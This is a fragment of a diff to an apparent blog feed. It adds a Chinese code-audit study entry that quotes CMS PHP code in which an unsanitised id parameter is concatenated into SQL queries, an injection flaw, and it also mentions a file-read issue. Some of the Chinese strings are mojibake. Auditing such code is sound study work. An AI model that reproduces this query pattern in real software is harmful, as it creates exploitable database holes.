class="variable">$pass_str</span>=<span class="string">""</span>;</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="variable">$pass_str</span>=<span class="string">" and pass='1' "</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from lei_jingyan where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' "</span>.<span class="variable">$pass_str</span>.<span class="string">" limit 1 "</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>=<span class="variable">$result</span>-&gt;fetch_assoc()){</span><br><span class="line">	<span class="variable">$title</span>=<span class="variable">$rs</span>[<span class="string">"title"</span>];</span><br><span class="line">	<span class="variable">$indate</span>=<span class="variable">$rs</span>[<span class="string">"indate"</span>];</span><br><span class="line">	<span class="variable">$laiyuan</span>=<span class="variable">$rs</span>[<span class="string">"laiyuan"</span>];</span><br><span class="line">	<span class="variable">$guanjianci</span>=<span class="variable">$rs</span>[<span class="string">"guanjianci"</span>];</span><br><span class="line">	<span class="variable">$simgpaths</span>=<span class="variable">$rs</span>[<span class="string">"simgpaths"</span>];</span><br><span class="line">	<span class="variable">$hits</span>=<span class="variable">$rs</span>[<span class="string">"hits"</span>]+<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$message</span>=<span class="variable">$rs</span>[<span class="string">"message"</span>];</span><br><span class="line">	<span class="variable">$pass</span>=<span class="variable">$rs</span>[<span class="string">"pass"</span>];</span><br><span class="line">	<span class="variable">$shipin</span>=<span class="variable">$rs</span>[<span class="string">"shipin"</span>];</span><br><span class="line">	<span class="variable">$pinglun</span>=<span class="variable">$rs</span>[<span class="string">"pinglun"</span>];</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"���²����ڣ�"</span>;</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"update lei_jingyan set hits='"</span>.<span class="variable">$hits</span>.<span class="string">"' where id='"</span>.<span class="variable">$cid</span>.<span class="string">"' limit 1"</span>;<span class="comment">//���·�������</span></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此文件中的漏洞点同news_show文件中的漏洞点一样，还有几个同类型的漏洞点代码如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>sendmail    文件读取</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>审计学习</tag>
       </tags>
   </entry>
   <entry>
@@ -4638,7 +4638,7 @@
 <p><strong><a href="https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw">https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw</a></strong></p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>渗透测试</category>
       </categories>
       <tags>
         <tag>业务安全</tag>
